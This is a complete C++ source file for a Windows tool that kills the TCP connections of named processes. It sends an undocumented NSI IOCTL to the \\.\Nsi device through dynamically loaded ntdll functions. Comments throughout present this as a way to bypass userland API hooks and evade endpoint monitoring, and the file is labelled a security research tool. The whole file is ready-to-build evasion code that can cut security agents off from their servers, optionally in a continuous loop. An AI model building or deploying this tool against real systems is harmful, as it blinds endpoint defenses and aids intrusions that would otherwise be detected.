#include <windows.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <set>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Psapi.lib")

// Advanced TCP Connection Killer - Security Research Tool
// Based on NSI (Network Store Interface) bypass techniques
// Implements multiple evasion layers to avoid API hooks

// ---------------------------------------------
// Dynamic NT Native Function Pointers
// ---------------------------------------------
typedef NTSTATUS(WINAPI* NtDeviceIoControlFile_t)(
    HANDLE, HANDLE, PVOID, PVOID,
    PVOID, ULONG, PVOID, ULONG, PVOID, ULONG);
typedef NTSTATUS(WINAPI* NtWaitForSingleObject_t)(
    HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef ULONG(WINAPI* RtlNtStatusToDosError_t)(NTSTATUS);

// Global function pointers for dynamic loading
NtDeviceIoControlFile_t pNtDeviceIoControlFile = nullptr;
NtWaitForSingleObject_t pNtWaitForSingleObject = nullptr;
RtlNtStatusToDosError_t pRtlNtStatusToDosError = nullptr;

// IO_STATUS_BLOCK structure for low-level I/O operations
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

// NSI (Network Store Interface) parameters structure
// This structure is used to communicate with the Windows kernel
// network stack at the lowest level, bypassing userland hooks
typedef struct _NSI_SET_PARAMETERS_EX {
    PVOID Reserved0;          // 0x00
    PVOID Reserved1;          // 0x08
    PVOID ModuleId;           // 0x10 - Points to TCP module GUID
    DWORD IoCode;             // 0x18 - Operation code (16 for TCP termination)
    DWORD Unused1;            // 0x1C
    DWORD Param1;             // 0x20 - Action parameter 1
    DWORD Param2;             // 0x24 - Action parameter 2
    PVOID InputBuffer;        // 0x28 - Pointer to TCP connection data
    DWORD InputBufferSize;    // 0x30 - Size of input buffer
    DWORD Unused2;            // 0x34
    PVOID MetricBuffer;       // 0x38 - Optional metrics buffer
    DWORD MetricBufferSize;   // 0x40 - Size of metrics buffer
    DWORD Unused3;            // 0x44
} NSI_SET_PARAMETERS_EX;

// TCP module identifier for NSI operations
// This GUID identifies the TCP protocol stack module
BYTE NPI_MS_TCP_MODULEID[] = {
    0x18, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x03, 0x4A, 0x00, 0xEB, 0x1A, 0x9B, 0xD4, 0x11,
    0x91, 0x23, 0x00, 0x50, 0x04, 0x77, 0x59, 0xBC
};

// TCP connection parameters for termination
// This structure contains the exact connection information
// needed to terminate a specific TCP connection
struct TcpKillParamsIPv4 {
    WORD  localAddrFamily;    // AF_INET (2)
    WORD  localPort;          // Local port in network byte order
    DWORD localAddr;          // Local IP address
    BYTE  reserved1[20];      // Padding for alignment
    WORD  remoteAddrFamily;   // AF_INET (2)
    WORD  remotePort;         // Remote port in network byte order
    DWORD remoteAddr;         // Remote IP address
    BYTE  reserved2[20];      // Padding for alignment
};

// Configuration structure for target processes
struct TargetConfig {
    std::vector<std::wstring> processNames;
    std::vector<std::wstring> whitelistedIPs;
    std::vector<DWORD> whitelistedPorts;
    bool logVerbose;
    bool continuousMonitoring;
    DWORD monitoringInterval;
};

// Load NT native functions dynamically
bool LoadNtFunctions() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        wprintf(L"[!] Failed to get handle to ntdll.dll\n");
        return false;
    }

    pNtDeviceIoControlFile = (NtDeviceIoControlFile_t)GetProcAddress(ntdll, "NtDeviceIoControlFile");
    pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(ntdll, "NtWaitForSingleObject");
    pRtlNtStatusToDosError = (RtlNtStatusToDosError_t)GetProcAddress(ntdll, "RtlNtStatusToDosError");

    if (!pNtDeviceIoControlFile || !pNtWaitForSingleObject || !pRtlNtStatusToDosError) {
        wprintf(L"[!] Failed to resolve NT native functions\n");
        return false;
    }

    wprintf(L"[+] NT native functions loaded successfully\n");
    return true;
}

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

// Low-level NSI device I/O control function
// This bypasses all userland API hooks and communicates directly with the kernel
ULONG NsiIoctl(
    DWORD dwIoControlCode,
    LPVOID lpInBuffer,
    DWORD nInBufferSize,
    LPVOID lpOutBuffer,
    LPDWORD lpBytesReturned,
    LPOVERLAPPED lpOverlapped
) {
    static HANDLE hDevice = INVALID_HANDLE_VALUE;

    // Open NSI device handle on first call
    if (hDevice == INVALID_HANDLE_VALUE) {
        HANDLE h = CreateFileW(L"\\\\.\\Nsi", 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

        if (h == INVALID_HANDLE_VALUE) {
            wprintf(L"[!] Failed to open NSI device: %lu\n", GetLastError());
            return GetLastError();
        }

        if (InterlockedCompareExchangePointer(&hDevice, h, INVALID_HANDLE_VALUE) != INVALID_HANDLE_VALUE) {
            CloseHandle(h);
        }

        wprintf(L"[+] NSI device opened successfully\n");
    }

    // Handle overlapped I/O if requested
    if (lpOverlapped) {
        if (!DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize,
            lpOutBuffer, *lpBytesReturned, lpBytesReturned, lpOverlapped)) {
            return GetLastError();
        }
        return 0;
    }

    // Synchronous I/O using NT native APIs
    HANDLE hEvent = CreateEvent(nullptr, FALSE, FALSE, nullptr);
    if (!hEvent) return GetLastError();

    IO_STATUS_BLOCK ioStatus = { 0 };
    NTSTATUS status = pNtDeviceIoControlFile(
        hDevice, hEvent, nullptr, nullptr,
        &ioStatus, dwIoControlCode,
        lpInBuffer, nInBufferSize,
        lpOutBuffer, *lpBytesReturned
    );

    if (status == STATUS_PENDING) {
        status = pNtWaitForSingleObject(hEvent, FALSE, nullptr);
        if (NT_SUCCESS(status))
            status = ioStatus.Status;
    }

    CloseHandle(hEvent);

    if (!NT_SUCCESS(status)) {
        ULONG dosError = pRtlNtStatusToDosError(status);
        return dosError;
    }

    *lpBytesReturned = (DWORD)ioStatus.Information;
    return 0;
}

// Enhanced NSI SetAllParameters function
// This is the core function that terminates TCP connections at the kernel level
ULONG MyNsiSetAllParameters(
    DWORD a1,
    DWORD a2,
    PVOID pModuleId,
    DWORD dwIoCode,
    PVOID pInputBuffer,
    DWORD cbInputBuffer,
    PVOID pMetricBuffer,
    DWORD cbMetricBuffer
) {
    NSI_SET_PARAMETERS_EX params = { 0 };
    DWORD cbReturned = sizeof(params);

    params.ModuleId = pModuleId;
    params.IoCode = dwIoCode;
    params.Param1 = a1;
    params.Param2 = a2;
    params.InputBuffer = pInputBuffer;
    params.InputBufferSize = cbInputBuffer;
    params.MetricBuffer = pMetricBuffer;
    params.MetricBufferSize = cbMetricBuffer;

    return NsiIoctl(
        0x120013,               // NSI IOCTL code for SetAllParameters
        &params, sizeof(params),
        &params, &cbReturned,
        nullptr
    );
}

// Enhanced TCP connection termination function
DWORD AdvancedSetTcpEntry(MIB_TCPROW_OWNER_PID* pTcpRow, bool logDetails) {
    if (!pTcpRow) return ERROR_INVALID_PARAMETER;

    // Prepare connection termination parameters
    TcpKillParamsIPv4 params = { 0 };
    params.localAddrFamily = AF_INET;
    params.localPort = (WORD)pTcpRow->dwLocalPort;
    params.localAddr = pTcpRow->dwLocalAddr;
    params.remoteAddrFamily = AF_INET;
    params.remotePort = (WORD)pTcpRow->dwRemotePort;
    params.remoteAddr = pTcpRow->dwRemoteAddr;

    if (logDetails) {
        IN_ADDR localAddr = { pTcpRow->dwLocalAddr };
        IN_ADDR remoteAddr = { pTcpRow->dwRemoteAddr };
        wprintf(L"[*] Terminating TCP connection: %S:%d -> %S:%d (PID: %lu)\n",
            inet_ntoa(localAddr), ntohs((u_short)pTcpRow->dwLocalPort),
            inet_ntoa(remoteAddr), ntohs((u_short)pTcpRow->dwRemotePort),
            pTcpRow->dwOwningPid);
    }

    // Execute low-level connection termination
    DWORD result = MyNsiSetAllParameters(
        1,                              // Action type: terminate
        2,                              // Action code: delete TCB
        (LPVOID)NPI_MS_TCP_MODULEID,   // TCP module identifier
        16,                             // I/O operation code
        &params, sizeof(params),        // Connection parameters
        nullptr, 0                      // No metrics buffer
    );

    return result;
}

// Get PIDs for specified process names with enhanced filtering
std::vector<DWORD> GetPidsByProcessName(const std::wstring& processName, const TargetConfig& config) {
    std::vector<DWORD> pids;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE) {
        if (config.logVerbose) {
            wprintf(L"[!] CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        }
        return pids;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (!Process32FirstW(snapshot, &pe)) {
        CloseHandle(snapshot);
        if (config.logVerbose) {
            wprintf(L"[!] Process32FirstW failed: %lu\n", GetLastError());
        }
        return pids;
    }

    do {
        if (_wcsicmp(processName.c_str(), pe.szExeFile) == 0) {
            pids.push_back(pe.th32ProcessID);
            if (config.logVerbose) {
                wprintf(L"[+] Found target process: %s (PID: %lu)\n",
                    pe.szExeFile, pe.th32ProcessID);
            }
        }
    } while (Process32NextW(snapshot, &pe));

    CloseHandle(snapshot);
    return pids;
}

// Check if IP address is in whitelist
bool IsWhitelistedIP(DWORD ipAddr, const TargetConfig& config) {
    IN_ADDR addr = { ipAddr };
    std::string ipStr = inet_ntoa(addr);
    std::wstring wIpStr(ipStr.begin(), ipStr.end());

    for (const auto& whiteIP : config.whitelistedIPs) {
        if (wIpStr == whiteIP) {
            return true;
        }
    }
    return false;
}

// Check if port is in whitelist
bool IsWhitelistedPort(DWORD port, const TargetConfig& config) {
    DWORD hostPort = ntohs((u_short)port);
    for (DWORD whitePort : config.whitelistedPorts) {
        if (hostPort == whitePort) {
            return true;
        }
    }
    return false;
}

// Enhanced TCP connection closure with filtering and logging
void CloseProcessTcpConnections(DWORD pid, const TargetConfig& config) {
    DWORD size = 0;
    PMIB_TCPTABLE2 tcpTable = nullptr;

    // Get required buffer size
    if (GetTcpTable2(nullptr, &size, TRUE) != ERROR_INSUFFICIENT_BUFFER) {
        if (config.logVerbose) {
            wprintf(L"[!] Failed to query TCP table size for PID %lu\n", pid);
        }
        return;
    }

    // Allocate buffer
    tcpTable = (PMIB_TCPTABLE2)malloc(size);
    if (!tcpTable) {
        if (config.logVerbose) {
            wprintf(L"[!] Memory allocation failed for PID %lu\n", pid);
        }
        return;
    }

    // Get TCP table
    if (GetTcpTable2(tcpTable, &size, TRUE) != NO_ERROR) {
        free(tcpTable);
        if (config.logVerbose) {
            wprintf(L"[!] Failed to get TCP table for PID %lu\n", pid);
        }
        return;
    }

    int closedCount = 0;
    int skippedCount = 0;

    // Process each TCP connection
    for (DWORD i = 0; i < tcpTable->dwNumEntries; ++i) {
        MIB_TCPROW2& row = tcpTable->table[i];

        // Filter by PID and connection state
        if (row.dwOwningPid != pid || row.dwState != MIB_TCP_STATE_ESTAB) {
            continue;
        }

        // Apply whitelist filters
        if (IsWhitelistedIP(row.dwRemoteAddr, config) ||
            IsWhitelistedPort(row.dwRemotePort, config)) {
            skippedCount++;
            if (config.logVerbose) {
                IN_ADDR remoteAddr = { row.dwRemoteAddr };
                wprintf(L"[~] Skipping whitelisted connection: %S:%d\n",
                    inet_ntoa(remoteAddr), ntohs((u_short)row.dwRemotePort));
            }
            continue;
        }

        // Terminate the connection
        DWORD result = AdvancedSetTcpEntry((MIB_TCPROW_OWNER_PID*)&row, config.logVerbose);

        if (result == NO_ERROR) {
            closedCount++;
        }
        else if (config.logVerbose) {
            wprintf(L"    [!] Failed to close connection. Error: %lu\n", result);
        }
    }

    if (closedCount > 0 || config.logVerbose) {
        wprintf(L"[=] PID %lu: Closed %d connections, Skipped %d connections\n",
            pid, closedCount, skippedCount);
    }

    free(tcpTable);
}

// Print usage information
void PrintUsage() {
    wprintf(L"Advanced TCP Connection Killer - Security Research Tool\n");
    wprintf(L"Usage: tcp_killer.exe [options] <process_names>\n\n");
    wprintf(L"Options:\n");
    wprintf(L"  -v, --verbose           Enable verbose logging\n");
    wprintf(L"  -c, --continuous        Continuous monitoring mode\n");
    wprintf(L"  -i, --interval <ms>     Monitoring interval in milliseconds (default: 1000)\n");
    wprintf(L"  -w, --whitelist-ip <ip> Whitelist IP address (can be used multiple times)\n");
    wprintf(L"  -p, --whitelist-port <port> Whitelist port (can be used multiple times)\n");
    wprintf(L"  -h, --help              Show this help message\n\n");
    wprintf(L"Examples:\n");
    wprintf(L"  tcp_killer.exe -v chrome.exe firefox.exe\n");
    wprintf(L"  tcp_killer.exe -c -i 500 -w 192.168.1.1 -p 443 malware.exe\n");
}

// Parse command line arguments
bool ParseArguments(int argc, wchar_t* argv[], TargetConfig& config) {
    config.logVerbose = false;
    config.continuousMonitoring = false;
    config.monitoringInterval = 1000;

    for (int i = 1; i < argc; i++) {
        std::wstring arg = argv[i];

        if (arg == L"-v" || arg == L"--verbose") {
            config.logVerbose = true;
        }
        else if (arg == L"-c" || arg == L"--continuous") {
            config.continuousMonitoring = true;
        }
        else if (arg == L"-i" || arg == L"--interval") {
            if (i + 1 < argc) {
                config.monitoringInterval = _wtoi(argv[++i]);
            }
        }
        else if (arg == L"-w" || arg == L"--whitelist-ip") {
            if (i + 1 < argc) {
                config.whitelistedIPs.push_back(argv[++i]);
            }
        }
        else if (arg == L"-p" || arg == L"--whitelist-port") {
            if (i + 1 < argc) {
                config.whitelistedPorts.push_back(_wtoi(argv[++i]));
            }
        }
        else if (arg == L"-h" || arg == L"--help") {
            PrintUsage();
            return false;
        }
        else if (arg[0] != L'-') {
            config.processNames.push_back(arg);
        }
    }

    return !config.processNames.empty();
}

// Main execution function
int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"[*] Advanced TCP Connection Killer v2.0 - Security Research Tool\n");
    wprintf(L"[*] Based on NSI bypass techniques for endpoint security research\n\n");

    TargetConfig config;

    if (!ParseArguments(argc, argv, config)) {
        if (config.processNames.empty()) {
            PrintUsage();
        }
        return 1;
    }

    // Initialize NT functions
    if (!LoadNtFunctions()) {
        wprintf(L"[!] Failed to initialize NT native functions\n");
        return 1;
    }

    wprintf(L"[*] Target processes: ");
    for (size_t i = 0; i < config.processNames.size(); i++) {
        wprintf(L"%s", config.processNames[i].c_str());
        if (i < config.processNames.size() - 1) wprintf(L", ");
    }
    wprintf(L"\n");

    if (!config.whitelistedIPs.empty()) {
        wprintf(L"[*] Whitelisted IPs: ");
        for (size_t i = 0; i < config.whitelistedIPs.size(); i++) {
            wprintf(L"%s", config.whitelistedIPs[i].c_str());
            if (i < config.whitelistedIPs.size() - 1) wprintf(L", ");
        }
        wprintf(L"\n");
    }

    if (!config.whitelistedPorts.empty()) {
        wprintf(L"[*] Whitelisted ports: ");
        for (size_t i = 0; i < config.whitelistedPorts.size(); i++) {
            wprintf(L"%lu", config.whitelistedPorts[i]);
            if (i < config.whitelistedPorts.size() - 1) wprintf(L", ");
        }
        wprintf(L"\n");
    }

    wprintf(L"[*] Starting connection monitoring...\n\n");

    // Main monitoring loop
    do {
        for (const auto& procName : config.processNames) {
            std::vector<DWORD> pids = GetPidsByProcessName(procName, config);

            for (DWORD pid : pids) {
                CloseProcessTcpConnections(pid, config);
            }
        }

        if (config.continuousMonitoring) {
            Sleep(config.monitoringInterval);
        }
    } while (config.continuousMonitoring);

    wprintf(L"[*] Monitoring completed\n");
    return 0;
}